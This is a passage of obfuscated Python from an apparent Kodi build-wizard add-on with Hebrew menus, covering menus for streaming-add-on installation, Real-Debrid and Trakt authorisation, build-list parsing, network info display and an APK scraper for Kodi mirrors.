	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2433
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2434
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2435
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2445
	setView ('files','viewType')#line:2446
def morsetup2 ():#line:2447
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2448
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2449
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2450
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2451
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2452
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2453
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2454
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2455
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2456
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2457
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2458
def fastupdate ():#line:2459
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2460
def forcefastupdate ():#line:2462
			OO0000O0O0O000O00 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2463
			wiz .ForceFastUpDate (ADDONTITLE ,OO0000O0O0O000O00 )#line:2464
def rdsetup ():#line:2468
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2469
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2470
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2472
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2473
def traktsetup ():#line:2476
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2477
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2478
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2479
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2480
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2481
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2482
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2483
	setView ('files','viewType')#line:2484
def setautorealdebrid ():#line:2485
    from resources .libs import real_debrid #line:2486
    OOO0OOO0O000000OO =real_debrid .RealDebridFirst ()#line:2487
    OOO0OOO0O000000OO .auth ()#line:2488
def setrealdebrid ():#line:2490
    OOOOOO0O0OOOO0000 =(ADDON .getSetting ("auto_rd"))#line:2491
    if OOOOOO0O0OOOO0000 =='false':#line:2492
       ADDON .openSettings ()#line:2493
    else :#line:2494
        from resources .libs import real_debrid #line:2495
        OOO00OO0O0OOO00O0 =real_debrid .RealDebrid ()#line:2496
        OOO00OO0O0OOO00O0 .auth ()#line:2497
        rdon ()#line:2500
def resolveurlsetup ():#line:2502
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2503
def urlresolversetup ():#line:2504
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2505
def placentasetup ():#line:2507
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2508
def reptiliasetup ():#line:2509
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2510
def flixnetsetup ():#line:2511
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2512
def yodasetup ():#line:2513
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2514
def numberssetup ():#line:2515
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2516
def uranussetup ():#line:2517
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2518
def genesissetup ():#line:2519
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2520
def net_tools (view =None ):#line:2522
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2523
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2524
	setView ('files','viewType')#line:2526
def speedMenu ():#line:2527
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.EA4all/speedtest.py")')#line:2528
def viewIP ():#line:2529
	O0O0OOOOOOOOO0O00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2543
	O00O000O00O0O0OO0 =[];OO0OOOO00OO0OOOO0 =0 #line:2544
	for O0OOO00O000O00OOO in O0O0OOOOOOOOO0O00 :#line:2545
		O0O00000O0OOO00O0 =wiz .getInfo (O0OOO00O000O00OOO )#line:2546
		O0O0OO000O0OOO000 =0 #line:2547
		while O0O00000O0OOO00O0 =="Busy"and O0O0OO000O0OOO000 <10 :#line:2548
			O0O00000O0OOO00O0 =wiz .getInfo (O0OOO00O000O00OOO );O0O0OO000O0OOO000 +=1 ;wiz .log ("%s sleep %s"%(O0OOO00O000O00OOO ,str (O0O0OO000O0OOO000 )));xbmc .sleep (1000 )#line:2549
		O00O000O00O0O0OO0 .append (O0O00000O0OOO00O0 )#line:2550
		OO0OOOO00OO0OOOO0 +=1 #line:2551
	OO0000O0000000O00 ,O000000OO000OO0OO ,O0OO000OOOOOOOOOO =getIP ()#line:2552
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O000O00O0O0OO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2553
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000O0000000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2554
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000OO000OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2555
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000OOOOOOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2556
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O000O00O0O0OO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2557
	setView ('files','viewType')#line:2558
def buildMenu ():#line:2560
	if USERNAME =='':#line:2561
		ADDON .openSettings ()#line:2562
		sys .exit ()#line:2563
	if PASSWORD =='':#line:2564
		ADDON .openSettings ()#line:2565
	OO0OO000OOO0O00OO =u_list (SPEEDFILE )#line:2566
	(OO0OO000OOO0O00OO )#line:2567
	OOO0000000000O0OO =(wiz .workingURL (OO0OO000OOO0O00OO ))#line:2568
	(OOO0000000000O0OO )#line:2569
	OOO0000000000O0OO =wiz .workingURL (SPEEDFILE )#line:2570
	if not OOO0000000000O0OO ==True :#line:2571
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2572
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2573
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2574
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2575
		addFile ('%s'%OOO0000000000O0OO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2576
	else :#line:2577
		OO0O0OOOO0O0000O0 ,O0OO0OOOOO0O00O00 ,O0O0OOO0OO0000000 ,O0000OOOOOO0O0OOO ,OOO0O000O0OO00000 ,O0000O000O0O0OO00 ,O0O0OO0OO000O00OO =wiz .buildCount ()#line:2578
		O0O0OOOOOO0O00O00 =False ;O0OO00000O0OOO000 =[]#line:2579
		if THIRDPARTY =='true':#line:2580
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O0OOOOOO0O00O00 =True ;O0OO00000O0OOO000 .append ('1')#line:2581
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O0OOOOOO0O00O00 =True ;O0OO00000O0OOO000 .append ('2')#line:2582
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O0OOOOOO0O00O00 =True ;O0OO00000O0OOO000 .append ('3')#line:2583
		OOO0O0O00OO0OO00O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2584
		O0O00O0O0OOOOOOO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0O0O00OO0OO00O )#line:2585
		if OO0O0OOOO0O0000O0 ==1 and O0O0OOOOOO0O00O00 ==False :#line:2586
			for O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ,O0OO000OOO0000O00 ,OOOO0OOO000O00O00 ,OO0OO0OOOOO0O0OO0 ,O0000O00O0O0OO0O0 ,O0O0O0O000OOOO000 ,OO0OOOO0OO0000000 ,OOO000OOO00O00OO0 ,OO00O000OOOOOOO00 in O0O00O0O0OOOOOOO0 :#line:2587
				if not SHOWADULT =='true'and OOO000OOO00O00OO0 .lower ()=='yes':continue #line:2588
				if not DEVELOPER =='true'and wiz .strTest (O000O00OO00O0O0O0 ):continue #line:2589
				viewBuild (O0O00O0O0OOOOOOO0 [0 ][0 ])#line:2590
				return #line:2591
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2594
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2595
		if O0O0OOOOOO0O00O00 ==True :#line:2596
			for OO000000O00000O0O in O0OO00000O0OOO000 :#line:2597
				O000O00OO00O0O0O0 =eval ('THIRD%sNAME'%OO000000O00000O0O )#line:2598
		if len (O0O00O0O0OOOOOOO0 )>=1 :#line:2600
			if SEPERATE =='true':#line:2601
				for O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ,O0OO000OOO0000O00 ,OOOO0OOO000O00O00 ,OO0OO0OOOOO0O0OO0 ,O0000O00O0O0OO0O0 ,O0O0O0O000OOOO000 ,OO0OOOO0OO0000000 ,OOO000OOO00O00OO0 ,OO00O000OOOOOOO00 in O0O00O0O0OOOOOOO0 :#line:2602
					if not SHOWADULT =='true'and OOO000OOO00O00OO0 .lower ()=='yes':continue #line:2603
					if not DEVELOPER =='true'and wiz .strTest (O000O00OO00O0O0O0 ):continue #line:2604
					OOOO00O0OO0OOOOOO =createMenu ('install','',O000O00OO00O0O0O0 )#line:2605
					addDir ('[%s] %s (v%s)'%(float (OO0OO0OOOOO0O0OO0 ),O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ),'viewbuild',O000O00OO00O0O0O0 ,description =OO00O000OOOOOOO00 ,fanart =OO0OOOO0OO0000000 ,icon =O0O0O0O000OOOO000 ,menu =OOOO00O0OO0OOOOOO ,themeit =THEME2 )#line:2606
			else :#line:2607
				if O0000OOOOOO0O0OOO >0 :#line:2608
					OOOOOO0O0000O0O0O ='+'if SHOW17 =='false'else '-'#line:2609
					if SHOW17 =='true':#line:2611
						for O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ,O0OO000OOO0000O00 ,OOOO0OOO000O00O00 ,OO0OO0OOOOO0O0OO0 ,O0000O00O0O0OO0O0 ,O0O0O0O000OOOO000 ,OO0OOOO0OO0000000 ,OOO000OOO00O00OO0 ,OO00O000OOOOOOO00 in O0O00O0O0OOOOOOO0 :#line:2613
							if not SHOWADULT =='true'and OOO000OOO00O00OO0 .lower ()=='yes':continue #line:2614
							if not DEVELOPER =='true'and wiz .strTest (O000O00OO00O0O0O0 ):continue #line:2615
							OOOO0O000O000O000 =int (float (OO0OO0OOOOO0O0OO0 ))#line:2616
							if OOOO0O000O000O000 ==17 :#line:2617
								OOOO00O0OO0OOOOOO =createMenu ('install','',O000O00OO00O0O0O0 )#line:2618
								addDir ('[%s] %s (v%s)'%(float (OO0OO0OOOOO0O0OO0 ),O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ),'viewbuild',O000O00OO00O0O0O0 ,description =OO00O000OOOOOOO00 ,fanart =OO0OOOO0OO0000000 ,icon =O0O0O0O000OOOO000 ,menu =OOOO00O0OO0OOOOOO ,themeit =THEME2 )#line:2619
				if OOO0O000O0OO00000 >0 :#line:2620
					OOOOOO0O0000O0O0O ='+'if SHOW18 =='false'else '-'#line:2621
					if SHOW18 =='true':#line:2623
						for O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ,O0OO000OOO0000O00 ,OOOO0OOO000O00O00 ,OO0OO0OOOOO0O0OO0 ,O0000O00O0O0OO0O0 ,O0O0O0O000OOOO000 ,OO0OOOO0OO0000000 ,OOO000OOO00O00OO0 ,OO00O000OOOOOOO00 in O0O00O0O0OOOOOOO0 :#line:2625
							if not SHOWADULT =='true'and OOO000OOO00O00OO0 .lower ()=='yes':continue #line:2626
							if not DEVELOPER =='true'and wiz .strTest (O000O00OO00O0O0O0 ):continue #line:2627
							OOOO0O000O000O000 =int (float (OO0OO0OOOOO0O0OO0 ))#line:2628
							if OOOO0O000O000O000 ==18 :#line:2629
								OOOO00O0OO0OOOOOO =createMenu ('install','',O000O00OO00O0O0O0 )#line:2630
								addDir ('[%s] %s (v%s)'%(float (OO0OO0OOOOO0O0OO0 ),O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ),'viewbuild',O000O00OO00O0O0O0 ,description =OO00O000OOOOOOO00 ,fanart =OO0OOOO0OO0000000 ,icon =O0O0O0O000OOOO000 ,menu =OOOO00O0OO0OOOOOO ,themeit =THEME2 )#line:2631
				if O0O0OOO0OO0000000 >0 :#line:2632
					OOOOOO0O0000O0O0O ='+'if SHOW16 =='false'else '-'#line:2633
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOOOO0O0000O0O0O ,O0O0OOO0OO0000000 ),'togglesetting','show16',themeit =THEME3 )#line:2634
					if SHOW16 =='true':#line:2635
						for O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ,O0OO000OOO0000O00 ,OOOO0OOO000O00O00 ,OO0OO0OOOOO0O0OO0 ,O0000O00O0O0OO0O0 ,O0O0O0O000OOOO000 ,OO0OOOO0OO0000000 ,OOO000OOO00O00OO0 ,OO00O000OOOOOOO00 in O0O00O0O0OOOOOOO0 :#line:2636
							if not SHOWADULT =='true'and OOO000OOO00O00OO0 .lower ()=='yes':continue #line:2637
							if not DEVELOPER =='true'and wiz .strTest (O000O00OO00O0O0O0 ):continue #line:2638
							OOOO0O000O000O000 =int (float (OO0OO0OOOOO0O0OO0 ))#line:2639
							if OOOO0O000O000O000 ==16 :#line:2640
								OOOO00O0OO0OOOOOO =createMenu ('install','',O000O00OO00O0O0O0 )#line:2641
								addDir ('[%s] %s (v%s)'%(float (OO0OO0OOOOO0O0OO0 ),O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ),'viewbuild',O000O00OO00O0O0O0 ,description =OO00O000OOOOOOO00 ,fanart =OO0OOOO0OO0000000 ,icon =O0O0O0O000OOOO000 ,menu =OOOO00O0OO0OOOOOO ,themeit =THEME2 )#line:2642
				if O0OO0OOOOO0O00O00 >0 :#line:2643
					OOOOOO0O0000O0O0O ='+'if SHOW15 =='false'else '-'#line:2644
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOOOO0O0000O0O0O ,O0OO0OOOOO0O00O00 ),'togglesetting','show15',themeit =THEME3 )#line:2645
					if SHOW15 =='true':#line:2646
						for O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ,O0OO000OOO0000O00 ,OOOO0OOO000O00O00 ,OO0OO0OOOOO0O0OO0 ,O0000O00O0O0OO0O0 ,O0O0O0O000OOOO000 ,OO0OOOO0OO0000000 ,OOO000OOO00O00OO0 ,OO00O000OOOOOOO00 in O0O00O0O0OOOOOOO0 :#line:2647
							if not SHOWADULT =='true'and OOO000OOO00O00OO0 .lower ()=='yes':continue #line:2648
							if not DEVELOPER =='true'and wiz .strTest (O000O00OO00O0O0O0 ):continue #line:2649
							OOOO0O000O000O000 =int (float (OO0OO0OOOOO0O0OO0 ))#line:2650
							if OOOO0O000O000O000 <=15 :#line:2651
								OOOO00O0OO0OOOOOO =createMenu ('install','',O000O00OO00O0O0O0 )#line:2652
								addDir ('[%s] %s (v%s)'%(float (OO0OO0OOOOO0O0OO0 ),O000O00OO00O0O0O0 ,OOOOOO0OOO00OO00O ),'viewbuild',O000O00OO00O0O0O0 ,description =OO00O000OOOOOOO00 ,fanart =OO0OOOO0OO0000000 ,icon =O0O0O0O000OOOO000 ,menu =OOOO00O0OO0OOOOOO ,themeit =THEME2 )#line:2653
		elif O0O0OO0OO000O00OO >0 :#line:2654
			if O0000O000O0O0OO00 >0 :#line:2655
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2656
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2657
			else :#line:2658
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2659
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2660
	setView ('files','viewType')#line:2661
def viewBuild (O00OOOOO00O00O00O ):#line:2663
	OOOOOOO00000O0OO0 =wiz .workingURL (SPEEDFILE )#line:2664
	if not OOOOOOO00000O0OO0 ==True :#line:2665
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2666
		addFile ('%s'%OOOOOOO00000O0OO0 ,'',themeit =THEME3 )#line:2667
		return #line:2668
	if wiz .checkBuild (O00OOOOO00O00O00O ,'version')==False :#line:2669
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2670
		addFile ('%s was not found in the builds list.'%O00OOOOO00O00O00O ,'',themeit =THEME3 )#line:2671
		return #line:2672
	OO0O000OO0O000OO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2673
	OOOO0OOOO0OOO0000 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00OOOOO00O00O00O ).findall (OO0O000OO0O000OO0 )#line:2674
	for O00O00OOOO0OOO000 ,OOOO00OO0OOOO0O0O ,O00000OOO0OOOO0OO ,OOO000OO0000O0O0O ,O0000O0O00OO00OO0 ,OO0OO000O000O0O0O ,OOOOO00O0OOOOOO0O ,OO000000OO00OO000 ,OO0OO00OO00000000 ,OO0O0OOO0O0O0000O in OOOO0OOOO0OOO0000 :#line:2675
		OO0OO000O000O0O0O =OO0OO000O000O0O0O if wiz .workingURL (OO0OO000O000O0O0O )else ICON #line:2676
		OOOOO00O0OOOOOO0O =OOOOO00O0OOOOOO0O if wiz .workingURL (OOOOO00O0OOOOOO0O )else FANART #line:2677
		O0O0OOO00OOO000OO ='%s (v%s)'%(O00OOOOO00O00O00O ,O00O00OOOO0OOO000 )#line:2678
		if BUILDNAME ==O00OOOOO00O00O00O and O00O00OOOO0OOO000 >BUILDVERSION :#line:2679
			O0O0OOO00OOO000OO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0O0OOO00OOO000OO ,BUILDVERSION )#line:2680
		O0000OOOOO0OO0O00 =int (float (KODIV ));OO0O00O0OOO00OOOO =int (float (OOO000OO0000O0O0O ))#line:2689
		if not O0000OOOOO0OO0O00 ==OO0O00O0OOO00OOOO :#line:2690
			if O0000OOOOO0OO0O00 ==16 and OO0O00O0OOO00OOOO <=15 :O0OOOO0O0OO0O0OO0 =False #line:2691
			else :O0OOOO0O0OO0O0OO0 =True #line:2692
		else :O0OOOO0O0OO0O0OO0 =False #line:2693
		addFile ('התקנה','install',O00OOOOO00O00O00O ,'fresh',description =OO0O0OOO0O0O0000O ,fanart =OOOOO00O0OOOOOO0O ,icon =OO0OO000O000O0O0O ,themeit =THEME1 )#line:2697
		if not O0000O0O00OO00OO0 =='http://':#line:2700
			if wiz .workingURL (O0000O0O00OO00OO0 )==True :#line:2701
				addFile (wiz .sep ('THEMES'),'',fanart =OOOOO00O0OOOOOO0O ,icon =OO0OO000O000O0O0O ,themeit =THEME3 )#line:2702
				OO0O000OO0O000OO0 =wiz .openURL (O0000O0O00OO00OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2703
				OOOO0OOOO0OOO0000 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O000OO0O000OO0 )#line:2704
				for OO0O00O000OOOOOOO ,OO0000000OO0OO00O ,OOOOO0OOO000OOOO0 ,OO0OOOOO000OO00O0 ,OO000OOO000OOOO00 ,OO0O0OOO0O0O0000O in OOOO0OOOO0OOO0000 :#line:2705
					if not SHOWADULT =='true'and OO000OOO000OOOO00 .lower ()=='yes':continue #line:2706
					OOOOO0OOO000OOOO0 =OOOOO0OOO000OOOO0 if OOOOO0OOO000OOOO0 =='http://'else OO0OO000O000O0O0O #line:2707
					OO0OOOOO000OO00O0 =OO0OOOOO000OO00O0 if OO0OOOOO000OO00O0 =='http://'else OOOOO00O0OOOOOO0O #line:2708
					addFile (OO0O00O000OOOOOOO if not OO0O00O000OOOOOOO ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO0O00O000OOOOOOO ,'theme',O00OOOOO00O00O00O ,OO0O00O000OOOOOOO ,description =OO0O0OOO0O0O0000O ,fanart =OO0OOOOO000OO00O0 ,icon =OOOOO0OOO000OOOO0 ,themeit =THEME3 )#line:2709
	setView ('files','viewType')#line:2710
def viewThirdList (O0O00OOO0OOOO00OO ):#line:2712
	O0O0OO0O00O0O00O0 =eval ('THIRD%sNAME'%O0O00OOO0OOOO00OO )#line:2713
	OOO0O0O0OOO00O000 =eval ('THIRD%sURL'%O0O00OOO0OOOO00OO )#line:2714
	OOO0O00OOO0OOO0O0 =wiz .workingURL (OOO0O0O0OOO00O000 )#line:2715
	if not OOO0O00OOO0OOO0O0 ==True :#line:2716
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2717
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2718
	else :#line:2719
		O0000O0O00OO0OO00 ,OO0OO0000O0OOOO0O =wiz .thirdParty (OOO0O0O0OOO00O000 )#line:2720
		addFile ("[B]%s[/B]"%O0O0OO0O00O0O00O0 ,'',themeit =THEME3 )#line:2721
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2722
		if O0000O0O00OO0OO00 :#line:2723
			for O0O0OO0O00O0O00O0 ,O000O0OO00OOOOO00 ,OOO0O0O0OOO00O000 ,OO0OOOOOO0OOOOO00 ,O00O0O00OOOOO00O0 ,O0OO0000OO0O0OO0O ,OOOOO0OOOOOOOOO00 ,OOOO0OOOOO00000O0 in OO0OO0000O0OOOO0O :#line:2724
				if not SHOWADULT =='true'and OOOOO0OOOOOOOOO00 .lower ()=='yes':continue #line:2725
				addFile ("[%s] %s v%s"%(OO0OOOOOO0OOOOO00 ,O0O0OO0O00O0O00O0 ,O000O0OO00OOOOO00 ),'installthird',O0O0OO0O00O0O00O0 ,OOO0O0O0OOO00O000 ,icon =O00O0O00OOOOO00O0 ,fanart =O0OO0000OO0O0OO0O ,description =OOOO0OOOOO00000O0 ,themeit =THEME2 )#line:2726
		else :#line:2727
			for O0O0OO0O00O0O00O0 ,OOO0O0O0OOO00O000 ,O00O0O00OOOOO00O0 ,O0OO0000OO0O0OO0O ,OOOO0OOOOO00000O0 in OO0OO0000O0OOOO0O :#line:2728
				addFile (O0O0OO0O00O0O00O0 ,'installthird',O0O0OO0O00O0O00O0 ,OOO0O0O0OOO00O000 ,icon =O00O0O00OOOOO00O0 ,fanart =O0OO0000OO0O0OO0O ,description =OOOO0OOOOO00000O0 ,themeit =THEME2 )#line:2729
def editThirdParty (O000OO00O0OO00O0O ):#line:2731
	OOOO0OO00O0000000 =eval ('THIRD%sNAME'%O000OO00O0OO00O0O )#line:2732
	O0O00O0O000O0000O =eval ('THIRD%sURL'%O000OO00O0OO00O0O )#line:2733
	O0OOOO0O0OOOOO0OO =wiz .getKeyboard (OOOO0OO00O0000000 ,'Enter the Name of the Wizard')#line:2734
	O000O00O0000O0000 =wiz .getKeyboard (O0O00O0O000O0000O ,'Enter the URL of the Wizard Text')#line:2735
	wiz .setS ('wizard%sname'%O000OO00O0OO00O0O ,O0OOOO0O0OOOOO0OO )#line:2737
	wiz .setS ('wizard%surl'%O000OO00O0OO00O0O ,O000O00O0000O0000 )#line:2738
def apkScraper (name =""):#line:2740
	if name =='kodi':#line:2741
		O0OO0OOO0O0O00OOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2742
		OOOOO0OOO000000OO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2743
		OO0OO00O0000OO0OO =wiz .openURL (O0OO0OOO0O0O00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2744
		O0OO000O00O0O000O =wiz .openURL (OOOOO0OOO000000OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2745
		OOOOOOOOO00OOO00O =0 #line:2746
		O000O00OOOO0O00O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0OO00O0000OO0OO )#line:2747
		O0000OO00O0O0000O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0OO000O00O0O000O )#line:2748
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2750
		OOOOOOO0O00OOO0O0 =False #line:2751
		for OOO000OOO00OOO000 ,name ,O0O0O0000O00OO0O0 ,OO0OO0000OO0000O0 in O000O00OOOO0O00O0 :#line:2752
			if OOO000OOO00OOO000 in ['../','old/']:continue #line:2753
			if not OOO000OOO00OOO000 .endswith ('.apk'):continue #line:2754
			if not OOO000OOO00OOO000 .find ('_')==-1 and OOOOOOO0O00OOO0O0 ==True :continue #line:2755
			try :#line:2756
				OOOO0000000000O0O =name .split ('-')#line:2757
				if not OOO000OOO00OOO000 .find ('_')==-1 :#line:2758
					OOOOOOO0O00OOO0O0 =True #line:2759
					O000O000OO0O00O0O ,OOO00000000O0O0O0 =OOOO0000000000O0O [2 ].split ('_')#line:2760
				else :#line:2761
					O000O000OO0O00O0O =OOOO0000000000O0O [2 ]#line:2762
					OOO00000000O0O0O0 =''#line:2763
				OO000O0OOOOO00O00 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0000000000O0O [0 ].title (),OOOO0000000000O0O [1 ],OOO00000000O0O0O0 .upper (),O000O000OO0O00O0O ,COLOR2 ,O0O0O0000O00OO0O0 .replace (' ',''),COLOR1 ,OO0OO0000OO0000O0 )#line:2764
				OOO00O0OOOOO000OO =urljoin (O0OO0OOO0O0O00OOO ,OOO000OOO00OOO000 )#line:2765
				addFile (OO000O0OOOOO00O00 ,'apkinstall',"%s v%s%s %s"%(OOOO0000000000O0O [0 ].title (),OOOO0000000000O0O [1 ],OOO00000000O0O0O0 .upper (),O000O000OO0O00O0O ),OOO00O0OOOOO000OO )#line:2766
